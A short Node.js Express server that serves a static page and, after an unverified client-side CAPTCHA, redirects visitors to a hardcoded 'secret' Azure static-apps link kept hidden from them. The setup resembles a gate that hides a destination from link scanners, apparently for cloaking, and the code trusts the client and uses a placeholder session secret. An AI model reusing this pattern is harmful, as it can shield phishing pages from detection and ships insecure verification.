const express = require('express');
const session = require('express-session');
const app = express();

// YOUR SECRET URL - Still hidden on the server
const TARGET_URL = process.env.TARGET_URL || 'https://happy-sky-087048d10.3.azurestaticapps.net/l/IZ2U5G';

app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'a-very-long-random-secret-string',
    resave: false,
    saveUninitialized: true,
}));

// Serve the HTML file from the 'public' folder
app.use(express.static('public'));

// Endpoint to redirect after CAPTCHA is solved (No Secret Key required)
app.post('/verify', (req, res) => {
    // We are trusting the client-side CAPTCHA here.
    // The server simply performs the redirect.
    res.redirect(302, TARGET_URL);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
